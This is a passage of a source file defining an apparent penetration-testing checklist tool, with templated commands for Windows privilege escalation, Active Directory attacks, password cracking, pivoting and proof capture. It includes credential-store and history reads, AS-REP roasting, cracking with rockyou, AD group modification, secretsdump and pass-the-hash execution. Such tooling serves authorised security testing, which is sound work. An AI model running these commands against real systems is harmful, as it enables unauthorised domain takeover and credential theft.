    id: "windows-privesc",
    number: "06",
    title: "Windows privilege escalation",
    summary: "Enumerate privileges, services, tasks, stored credentials, and local-only listeners before uploading helpers.",
    items: [
      {
        id: "windows-context",
        title: "Capture host and user context",
        commands: [
          { label: "Identity", value: "cmd.exe /d /c \"whoami /all & hostname & systeminfo & ipconfig /all\"" },
          { label: "Local users", value: "cmd.exe /d /c \"net user & net localgroup administrators\"" },
        ],
      },
      {
        id: "windows-services",
        title: "Inspect services and unquoted paths",
        commands: [
          { label: "Services", value: "powershell -c \"Get-CimInstance Win32_Service | Select Name,State,StartName,PathName | Format-Table -Auto\"" },
          { label: "Writable service binaries", value: "powershell -c \"Get-CimInstance Win32_Service | ? PathName | % { $_.PathName }\"" },
          { label: "DLL search-path directory ACLs", value: "powershell -NoProfile -Command \"$env:Path -split ';' | Where-Object { $_ } | ForEach-Object { $p=$_.Trim(); if (Test-Path $p) { Write-Host ('=== ' + $p); icacls $p } }\"" },
        ],
      },
      {
        id: "windows-jobs",
        title: "Inspect tasks, autoruns, and local ports",
        commands: [
          { label: "Scheduled tasks", value: "schtasks /query /fo LIST /v" },
          { label: "Autoruns", value: "cmd.exe /d /c \"reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run & reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" },
          { label: "Listeners", value: "cmd.exe /d /c \"netstat -ano | findstr LISTENING & tasklist /svc\"" },
        ],
      },
      {
        id: "windows-secrets",
        title: "Check stored credentials and configuration",
        commands: [
          { label: "Credential Manager", value: "cmdkey /list" },
          { label: "Unattended files", value: "cmd.exe /d /c \"dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml C:\\*.config 2>nul\"" },
          { label: "PowerShell history", value: "cmd.exe /d /c \"type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\"" },
        ],
      },
      {
        id: "windows-privileges-policy",
        title: "Validate token privileges and installer policy",
        commands: [
          { label: "Token privileges", value: "cmd.exe /d /c \"whoami /priv & whoami /groups\"" },
          { label: "AlwaysInstallElevated", value: "cmd.exe /d /c \"reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\"" },
          { label: "Program directory permissions", value: "powershell -c \"Get-ChildItem 'C:\\Program Files','C:\\Program Files (x86)' -Directory -ErrorAction SilentlyContinue | ForEach-Object { try { $acl=Get-Acl $_.FullName; [pscustomobject]@{Path=$_.FullName;Access=($acl.Access | ? {$_.IdentityReference -match 'Users|Everyone|Authenticated Users'} | % FileSystemRights) -join ','} } catch {} } | ? Access | Format-Table -Auto\"" },
        ],
      },
      {
        id: "windows-helper",
        title: "Run one packaged helper if manual checks stall",
        detail: "Only after the manual checks: locate one preinstalled Kali binary, stage it through the transfer card, verify its checksum, run it once, preserve the output, and remove both helper and output when evidence retention permits.",
        commands: [
          { label: "Find WinPEAS on Kali", value: "find /usr/share/windows-resources -type f \\( -iname 'winpeas*x64*.exe' -o -iname 'winPEASany.exe' \\) 2>/dev/null" },
          { label: "Save output", stateChange: "target-file", verificationCommand: "powershell -c \"Get-Item 'C:\\Windows\\Temp\\winpeas.txt' | Select-Object FullName,Length\"", cleanup: { required: true, command: "powershell -c \"Remove-Item -Force 'C:\\Windows\\Temp\\winpeas.txt'\"", note: "Remove the helper output only after preserving the required evidence." }, value: "winPEASx64.exe log=console > C:\\Windows\\Temp\\winpeas.txt" },
        ],
      },
    ],
  },
  {
    id: "active-directory",
    number: "07",
    title: "Active Directory",
    summary: "Fix names and time first. Prefer NetExec and Impacket so the Kali-side workflow stays small.",
    items: [
      {
        id: "ad-baseline",
        title: "Confirm domain DNS and clock",
        commands: [
          { label: "DNS", value: "dig @{{rhost}} _ldap._tcp.dc._msdcs.{{domain}} SRV +short" },
          { label: "Temporarily disable Kali NTP", stateChange: "local-system", cleanup: { required: true, command: "sudo timedatectl set-ntp true", note: "Restore normal Kali time synchronization after Kerberos work." }, verificationCommand: "timedatectl status", value: "sudo timedatectl set-ntp false" },
          { label: "Sync Kali time from the domain controller", stateChange: "local-system", cleanup: { required: true, command: "sudo timedatectl set-ntp true", note: "Restore normal Kali time synchronization after Kerberos work." }, verificationCommand: "timedatectl status", value: "sudo net time set -S {{rhost}}" },
          { label: "Credential test", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --shares" },
        ],
      },
      {
        id: "ad-enum",
        title: "Enumerate users, groups, and policy",
        commands: [
          { label: "Users and groups", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --users --groups --pass-pol" },
          { label: "BloodHound collection", value: "bloodhound-python -u '{{user}}' -p '{{password}}' -d {{domain}} -ns {{rhost}} -c All --zip" },
        ],
      },
      {
        id: "ad-trusts",
        title: "Enumerate domain trusts",
        detail: "Query trust objects from Kali with the one selected domain credential. Record direction, type, attributes, and SID before considering any cross-domain path.",
        commands: [
          { label: "LDAP trusted-domain objects", value: "ldapsearch -x -H ldap://{{rhost}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{baseDn}}' '(objectClass=trustedDomain)' cn trustPartner trustDirection trustType trustAttributes securityIdentifier" },
        ],
      },
      {
        id: "ad-bloodhound-paths",
        title: "Find shortest BloodHound attack paths",
        detail: "Upload the collected ZIP into BloodHound, set BLOODHOUND SOURCE and BLOODHOUND TARGET to object names (for example OPERATOR@CORP.TEST and DOMAIN ADMINS@CORP.TEST), then run one generated command. It saves a Cypher query under the target notes directory; paste that query into Explore > Cypher. Mark compromised principals as owned to use the owned-to-high-value query. Review every returned edge before choosing an abuse command.",
        commands: [],
      },
      {
        id: "ad-roast",
        title: "Check for AS-REP roastable users",
        detail: "Build users.txt only from operator-confirmed account names. Request AS-REPs as a separate target interaction, then crack the saved material entirely offline with one chosen tool. A recovered string remains a candidate credential until the operator saves and explicitly selects it.",
        commands: [
          { label: "AS-REP tracked users into target loot", value: "users_file=\"{{workspaceRoot}}/{{targetSlug}}/loot/users.txt\"; loot=\"{{workspaceRoot}}/{{targetSlug}}/loot/kerberos/asrep\"; test -s \"$users_file\" || { echo \"[-] Build the target users file from Findings first\"; exit 1; }; mkdir -p \"$loot\"; impacket-GetNPUsers '{{domain}}/' -dc-ip {{rhost}} -usersfile \"$users_file\" -no-pass -format hashcat -outputfile \"$loot/asrep.hashes\" | tee \"$loot/enumeration.txt\"" },
          { label: "Verify selected AS-REP cracking wordlist", value: "test -r '{{wordlist}}' && wc -l '{{wordlist}}'" },
          { label: "Crack saved AS-REP hashes with Hashcat", value: "loot='{{workspaceRoot}}/{{targetSlug}}/loot/kerberos/asrep'; hashes=\"$loot/asrep.hashes\"; potfile=\"$loot/hashcat.potfile\"; test -s \"$hashes\" || { echo \"No AS-REP hashes found at $hashes\"; exit 1; }; hashcat -m 18200 \"$hashes\" '{{wordlist}}' --potfile-path \"$potfile\" --session '{{targetSlug}}-asrep'; hashcat -m 18200 \"$hashes\" --potfile-path \"$potfile\" --show | tee \"$loot/hashcat-cracked.txt\"" },
          { label: "Crack saved AS-REP hashes with John", value: "loot='{{workspaceRoot}}/{{targetSlug}}/loot/kerberos/asrep'; hashes=\"$loot/asrep.hashes\"; potfile=\"$loot/john.pot\"; test -s \"$hashes\" || { echo \"No AS-REP hashes found at $hashes\"; exit 1; }; john --format=krb5asrep --pot=\"$potfile\" --wordlist='{{wordlist}}' \"$hashes\"; john --format=krb5asrep --pot=\"$potfile\" --show \"$hashes\" | tee \"$loot/john-cracked.txt\"" },
        ],
      },
      {
        id: "ad-spn-tgs",
        title: "Kerberoast SPN accounts into target loot",
        detail: "Only the credential explicitly selected for this machine generates a GetUserSPNs command. Enumeration output and hashes.txt stay under the current machine and credential identity. Printed ticket hashes are preserved for separate, operator-selected offline cracking commands.",
        commands: [
          { label: "Inventory saved SPN/TGS loot", value: "root=\"{{workspaceRoot}}/{{targetSlug}}/loot/kerberos/spn_tgs\"; mkdir -p \"$root\"; find \"$root\" -type f -printf '%TY-%Tm-%Td %TH:%TM %s %p\\n' | sort" },
        ],
      },
      {
        id: "ad-group-membership",
        title: "Exercise delegated control over a group",
        detail: "Use this only after confirming that the selected identity has GenericAll, GenericWrite, or WriteProperty over TARGET GROUP. These Kali-side Samba commands list direct members, add MEMBER USER, verify the result, and provide cleanup without requiring PowerShell or WinRM.",
        commands: [
          { label: "List direct group members", value: "net rpc group members '{{targetGroup}}' -S '{{rhost}}' -U '{{domain}}/{{user}}%{{password}}'" },
          { label: "Add selected member", value: "net rpc group addmem '{{targetGroup}}' '{{memberUser}}' -S '{{rhost}}' -U '{{domain}}/{{user}}%{{password}}' && printf '%s\\n' 'Added {{memberUser}} to {{targetGroup}}'" },
          { label: "Verify direct group members", value: "net rpc group members '{{targetGroup}}' -S '{{rhost}}' -U '{{domain}}/{{user}}%{{password}}'" },
          { label: "Cleanup: remove selected member", value: "net rpc group delmem '{{targetGroup}}' '{{memberUser}}' -S '{{rhost}}' -U '{{domain}}/{{user}}%{{password}}' && printf '%s\\n' 'Removed {{memberUser}} from {{targetGroup}}'" },
        ],
      },
      {
        id: "ad-temporary-user",
        title: "Create one temporary delegated account (fallback)",
        detail: "Use only after confirming that the selected identity may create domain users and that adding the current principal directly is unsuitable. Record the original saved credential ID in TEMPORARY CREATOR CREDENTIAL before creation; lifecycle cards use that saved record and disable themselves whenever another credential is selected. Creation, verification, later group membership, ACL work, and deletion remain separate operator actions. Save and select the temporary credential for later ACL work, but reselect the original creator before cleanup. After DACL restoration and group cleanup, delete the exact account and confirm it is absent.",
        commands: [],
      },
      {
        id: "ad-domain-writedacl",
        title: "Exercise WriteDACL over a directory object",
        detail: "Use this only after confirming WriteDACL or equivalent control over ACL TARGET. The generated Kali-side workflow can first add MEMBER USER to an optional permission-bearing TARGET GROUP, then uses impacket-dacledit to read, back up, modify, verify, and restore the target DACL. ACL PRINCIPAL receives ACL RIGHTS. DCSync retrieval commands appear only when DCSync is selected. The latest timestamped backup is recorded for one-command restoration.",
        commands: [],
      },
      {
        id: "ad-remote",
        title: "Test permitted remote administration",
        commands: [
          { label: "WinRM", value: "nxc winrm {{rhost}} -u '{{user}}' -p '{{password}}'" },
          { label: "Evil-WinRM", value: "evil-winrm -i {{rhost}} -u '{{user}}' -p '{{password}}'" },
          { label: "WMI with hash", value: "impacket-wmiexec -hashes ':{{hash}}' '{{domain}}/{{user}}@{{rhost}}'" },
        ],
      },
      {
        id: "ad-delegation-adcs",
        title: "Check delegation, protected accounts, and AD CS",
        detail: "Treat scanner output as a lead. Confirm the exact object, right, template setting, and effective principal before documenting an abuse path.",
        commands: [
          { label: "Delegation and protected users", value: "ldapsearch -x -H ldap://{{rhost}} -D '{{domain}}\\{{user}}' -w '{{password}}' -b '{{baseDn}}' '(|(userAccountControl:1.2.840.113556.1.4.803:=524288)(userAccountControl:1.2.840.113556.1.4.803:=16777216)(adminCount=1))' sAMAccountName userAccountControl adminCount msDS-AllowedToDelegateTo" },
          { label: "AD CS vulnerable templates", value: "certipy find -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{rhost}} -enabled -vulnerable -stdout" },
          { label: "Admin-only credential dump check", value: "impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{rhost}}' -just-dc-user '{{user}}'" },
        ],
      },
    ],
  },
  {
    id: "credentials",
    number: "08",
    title: "Credentials",
    summary: "Identify the format, run a bounded offline attack, and record every reuse attempt instead of repeating it from memory.",
    items: [
      {
        id: "creds-identify",
        title: "Identify and normalize captured hashes",
        commands: [
          { label: "Identify", value: "hashid -m '{{hashesFile}}'" },
          { label: "Show example modes", value: "hashcat --example-hashes | less" },
        ],
      },
      {
        id: "creds-crack",
        title: "Try the common Kali wordlist",
        commands: [
          { label: "Prepare rockyou", value: "if test ! -f /usr/share/wordlists/rockyou.txt; then sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz; fi; test -r /usr/share/wordlists/rockyou.txt && wc -l /usr/share/wordlists/rockyou.txt", resultCategory: "preparation" },
          { label: "Hashcat", value: "loot='{{workspaceRoot}}/{{targetSlug}}/loot/credentials/cracking'; potfile=\"$loot/hashcat.potfile\"; mkdir -p \"$loot\"; hashcat -m {{hashMode}} '{{hashesFile}}' /usr/share/wordlists/rockyou.txt --potfile-path \"$potfile\" --status --session '{{targetSlug}}-credentials'; hashcat -m {{hashMode}} '{{hashesFile}}' --potfile-path \"$potfile\" --show | tee \"$loot/hashcat-cracked.txt\"" },
          { label: "John", value: "loot='{{workspaceRoot}}/{{targetSlug}}/loot/credentials/cracking'; potfile=\"$loot/john.pot\"; mkdir -p \"$loot\"; john --pot=\"$potfile\" --wordlist=/usr/share/wordlists/rockyou.txt '{{hashesFile}}'; john --pot=\"$potfile\" --show '{{hashesFile}}' | tee \"$loot/john-cracked.txt\"" },
        ],
      },
      {
        id: "creds-reuse",
        title: "Test known credentials across the target",
        detail: "Use only the one credential explicitly selected for this machine. Test one exposed service at a time and record each response; do not turn reuse into an automatic protocol chain.",
        commands: [
          { label: "SMB authentication", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}'" },
          { label: "WinRM authentication", value: "nxc winrm {{rhost}} -u '{{user}}' -p '{{password}}'" },
          { label: "SSH authentication", value: "ssh -o PreferredAuthentications=password '{{user}}@{{rhost}}'" },
        ],
      },
      {
        id: "creds-spray",
        title: "Run a bounded password spray",
        detail: "Review domain lockout policy first. Start with one strong candidate password and jitter; only use discovered-password or bounded rockyou lists when the risk is acceptable.",
        commands: [
          { label: "Review password policy first", value: "nxc smb {{rhost}} -u '{{user}}' -p '{{password}}' --pass-pol" },
        ],
      },
    ],
  },
  {
    id: "pivoting",
    number: "09",
    title: "Pivoting",
    summary: "Choose one manual topology, confirm every step, and remove routes, listeners, processes, and staged files in reverse order.",
    items: [
      {
        id: "pivot-playbook",
        title: "Run one explicit pivot playbook",
        detail: "Start with direct access and create tunnel state only after proving it is required. Select one topology below; every command remains a separate, operator-reviewed step with its own RUN ON host, verification, callback direction, and cleanup.",
        pivotPlaybookSelector: true,
        commands: [],
      },
    ],
  },
  {
    id: "proof",
    number: "10",
    title: "Proof & reporting",
    summary: "Capture the flag, identity, and network context together, then preserve command output and hashes.",
    items: [
      {
        id: "proof-linux",
        title: "Capture Linux proof context",
        detail: "Capture the proof value from its original location in an interactive shell. Keep the target IP, current identity, file path, and file contents visible together in the screenshot.",
        commands: [
          { label: "User-level proof block", value: "hostname; whoami; id; ip addr; find /home -name '{{userFlagName}}' -print -exec cat {} \\; 2>/dev/null" },
          { label: "Root proof block", value: "hostname; whoami; id; ip addr; flag_path=$(find /root -name '{{rootFlagName}}' -print -quit 2>/dev/null); echo \"$flag_path\"; test -n \"$flag_path\" && cat \"$flag_path\"" },
        ],
      },
      {
        id: "proof-windows",
        title: "Capture Windows proof context",
        detail: "Capture the proof value from its original location in an interactive shell. Keep ipconfig, whoami, the original file path, and file contents visible together in the screenshot.",
        commands: [
          { label: "User-level proof block", value: "cmd.exe /d /c \"hostname & whoami & ipconfig | findstr IPv4 & echo Proof path: C:\\Users\\%USERNAME%\\Desktop\\{{userFlagName}} & type C:\\Users\\%USERNAME%\\Desktop\\{{userFlagName}}\"" },
          { label: "Administrator proof block", value: "cmd.exe /d /c \"hostname & whoami & ipconfig | findstr IPv4 & echo Proof path: C:\\Users\\Administrator\\Desktop\\{{rootFlagName}} & type C:\\Users\\Administrator\\Desktop\\{{rootFlagName}}\"" },
        ],
      },
      {
        id: "proof-artifacts",
        title: "Hash and inventory evidence",
        commands: [
          { label: "Evidence hashes", value: "root='{{workspaceRoot}}/{{targetSlug}}'; manifest=\"$root/notes/SHA256SUMS\"; temporary=\"$manifest.tmp\"; find \"$root\" -type f ! -path \"$manifest\" ! -path \"$temporary\" ! -path \"$root/notes/terminal.log\" ! -path \"$root/notes/commands/*\" -print0 | sort -z | xargs -0 sha256sum > \"$temporary\" && mv \"$temporary\" \"$manifest\"; count=$(wc -l < \"$manifest\"); printf 'Hashed %s static evidence files; live terminal logs excluded\\n' \"$count\"" },
          { label: "File inventory", value: "root='{{workspaceRoot}}/{{targetSlug}}'; inventory=\"$root/notes/inventory.txt\"; temporary=\"$inventory.tmp\"; find \"$root\" -type f ! -path \"$inventory\" ! -path \"$temporary\" -printf '%TY-%Tm-%Td %TH:%TM %s %p\\n' | sort > \"$temporary\" && mv \"$temporary\" \"$inventory\"; wc -l \"$inventory\"" },
        ],
      },
      {
        id: "proof-cleanup",
        title: "Record cleanup and reset points",
        detail: "List uploaded files, changed configuration, created accounts, services, scheduled tasks, routes, and tunnels.",
        commands: [
          {
            label: "Stop terminal log",
            purpose: "Exit the reusable recorded shell that owns this machine's transcript, flushing the log before report generation.",
            runsOn: "lhost",
            resultCategory: "cleanup",
            sessionRole: "machine-log",
            terminalBehavior: "existing-session-only",
            requiresExistingSession: true,
            requiresExplicitSession: true,
            verificationCommand: "test -s '{{workspaceRoot}}/{{targetSlug}}/notes/terminal.log'",
            value: "exit",
          },
          { label: "Remove an owned Ligolo route", stateChange: "network-route", cleanup: { required: false, command: "", note: "This card is the cleanup action." }, verificationCommand: "ip route show {{internalSubnet}}", value: "sudo ip route del {{internalSubnet}} dev {{pivotInterface}}" },
          { label: "Delete an owned Ligolo interface", stateChange: "network-route", cleanup: { required: false, command: "", note: "This card is the cleanup action; remove its owned routes first." }, verificationCommand: "ip -br link show {{pivotInterface}}", value: "sudo ip link del {{pivotInterface}}" },
        ],
      },
    ],
  },
];

export const CHECKLIST = normalizeChecklist(CHECKLIST_SOURCE);

export const ALL_ITEMS = CHECKLIST.flatMap((phase) =>
  phase.items.map((item) => ({ ...item, phaseId: phase.id, phaseTitle: phase.title })),
);
